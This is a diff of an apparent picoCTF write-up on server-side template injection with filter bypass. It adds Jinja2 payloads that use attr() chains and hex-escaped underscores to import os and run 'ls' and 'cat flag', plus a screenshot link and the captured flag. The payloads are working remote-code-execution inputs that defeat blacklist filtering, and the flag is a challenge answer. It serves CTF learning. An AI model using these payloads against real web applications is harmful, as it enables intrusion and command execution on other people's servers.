@@ -38,7 +38,22 @@ if r.status_code == 200:
             print("class name: ", class_names[i], "index: ", i)
             exit(0)
 '''
-payload
+
+try to print all of directories
+
 '''
-{{"".__class__.__base__.__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen('cat flag').read()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 '''
+
+<img width="1011" height="738" alt="Screenshot 2025-08-17 at 10 38 24 PM" src="https://github.com/user-attachments/assets/fa27a38b-ab5c-4f96-94c6-a6d130ac1711" />
+
+attempt to open flag
+
+'''
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+'''
+
+picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}
+
+
+
